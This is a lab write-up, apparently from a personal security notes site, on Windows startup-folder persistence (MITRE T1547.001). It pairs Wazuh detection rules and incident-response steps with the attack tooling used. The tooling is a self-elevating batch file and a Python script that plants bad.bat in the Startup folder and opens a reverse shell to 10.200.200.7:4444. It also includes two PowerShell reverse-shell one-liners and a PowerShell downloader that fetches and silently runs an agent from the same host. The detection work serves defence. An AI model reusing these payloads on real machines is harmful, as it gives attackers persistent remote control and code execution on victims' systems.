---
{"dg-publish":true,"permalink":"/mitreattck-analysis/persistence-t1547-001/persistence-t1547-001/","tags":["mitre"]}
---

[[MITREATTCKAnalysis/Threat Analysis with ATT&CK\|Threat Analysis with ATT&CK]]
### Summary
---
### Initials
---
- **Atomic Red Team ID**: T1547.001 - Persistence
- **Description**: Using various techniques to maintain access across system restarts, change credentials or any other interruptions, in this experiment a malware that adds a `.bat` file on the public User's startup folder that creates a reverse shell.
- **Challenges Encountered & Solution*:
	- It requires running the script with administrative privilege.
## Analysis
---
File is added in user's public startup directory, one of the symptoms of a persistence, there are many ways to establish persistence one of the ways is modifying the registry or adding files in the task scheduler:

![Pasted image 20240811215835.png](/img/user/x/images/Pasted%20image%2020240811215835.png)

However the reverse shell or network connection but the command such as `whoami` is detected as well as:

![Pasted image 20240811215850.png](/img/user/x/images/Pasted%20image%2020240811215850.png)

### WAZUH. rule creation
---
In a normal environment, our clients usually connect to _well-known ports_ such as port 21, 80, 443 but rarely on something like 4444 which is the default port used in metasploit for reverse shells.

We can create blacklist or whitelist depending on the fields extracted in the decoding phase by using Wazuh's Constant Database (CDB).

1. Create a file name `/var/ossec/etc/lists/common-ports` at the manager.
2. Then input the most well-known ports (this should be tailored around the environment for example if organization never uses ssh then remove port 21 from the list) follow the format

```
22:
80:
```

3. Change the permission so Wazuh can detect this file:

```bash
chown wazuh:wazuh common-ports
chmod 660 common-ports
```

4. Navigate and open a text editor to `/var/ossec/etc/ossec.conf` and find the `<ruleset>` section and add the following:

```XML
<list>etc/lists/common-ports</list>
```

Should go something like this:

![Pasted image 20240811215904.png](/img/user/x/images/Pasted%20image%2020240811215904.png)
7. Add the rules to detect the attack:

```XML
<!-- Abnormal Destination Port Detected -->  
<rule id="102503" level="10">  
  <if_group>sysmon_event3</if_group>  
  <list field="win.eventdata.destinationPort" lookup="not_address_match_key">etc/lists/common-ports</list>  
  <description>Sysmon - Event 3: Network connection to Uncommon Port by $(win.eventdata.image)</description>  
  <group>sysmon_event3,</group>  
</rule>
```

Should look something like this:

![Pasted image 20240811215909.png](/img/user/x/images/Pasted%20image%2020240811215909.png)
## Incident Response
---
- **Incident identification criteria** - file added to startup folder for either the public or users directory.
- **Investigation steps** - strange process and cmd window popup at start up
- **Containment actions** - disconnect the compromised host
- **Eradication procedures** - remove the file from the startup folder and it's parent image.
- **Recovery steps** - Implemented File Integrity Monitoring with Wazuh to detect changes at start up folders.

```C
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Run file as administrator:

```C
@echo off

:: Check if the script is running as admin

net session >nul 2>&1

if %errorLevel% neq 0 (

    echo Requesting elevation...

    powershell.exe Start-Process "%~0" -Verb RunAs

    exit /b

)

:: Run the Python script

python "C:\Users\lauraArseid\Documents\evil.py"
```

The Malware:

```python
import sys
import os.path
import os,socket,subprocess,threading;


# Get the python path:
python_path = sys.executable

# Get the current directory of where this python executing
current_file_path = path = os.path.abspath(os.path.dirname(__file__))
current_file_path_name = path = os.path.abspath(__file__)

path = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\bad.bat'

check_file = os.path.isfile(path)

# Revere shgell
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

if not check_file:
    # Write a .bat script to execute on user login
    with open("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\bad.bat", "a") as bad_bat:
        bad_bat.write("@echo off\n")
        bad_bat.write(f'python "{current_file_path_name}"')
else:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.200.200.7",4444))

    p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()
```

The reverse shell used:

```
$LHOST = "10.200.200.7"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.200.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


```Powershell
$server="http://10.200.200.7:8000";  
$url="$server/test.txt";  
$wc=New-Object System.Net.WebClient;  
$wc.Headers.add("platform","windows");  
$wc.Headers.add("file","sandcat.go");  
$data=$wc.DownloadData($url);  
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");  
get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;  
rm -force "C:\Users\Public\$name.exe" -ea ignore;  
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;  
Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```


```XML
<group name="syscheck,pci_dss_11.5,nist_800_53_SI.7,">
    <!-- Rules for Windows systems -->
    <rule id="100200" level="7">
        <if_sid>550</if_sid>
        <field name="file">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</field>
        <description>File modified in startup directory.</description>
    </rule>
    <rule id="100201" level="7">
        <if_sid>554</if_sid>
        <field name="file">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</field>
        <description>File added to startup directory.</description>
    </rule>
</group>
```

```XML
<group name="syscheck,pci_dss_11.5,nist_800_53_SI.7,">
  <rule id="100200" level="7">
    <if_sid>550</if_sid>
    <field name="file">^C:\\Users\\.*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</field>
    <description>File modified in user startup directory.</description>
  </rule>
  <rule id="100201" level="7">
    <if_sid>554</if_sid>
    <field name="file">^C:\\Users\\.*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</field>
    <description>File added to user startup directory.</description>
  </rule>
  
<rule id="100200" level="7">
        <if_sid>550</if_sid>
        <field name="file">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</field>
        <description>File modified in startup directory.</description>
    </rule>
    <rule id="100201" level="7">
        <if_sid>554</if_sid>
        <field name="file">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</field>
        <description>File added to startup directory.</description>
    </rule>
</group>
```

![Pasted image 20240811215918.png](/img/user/x/images/Pasted%20image%2020240811215918.png)
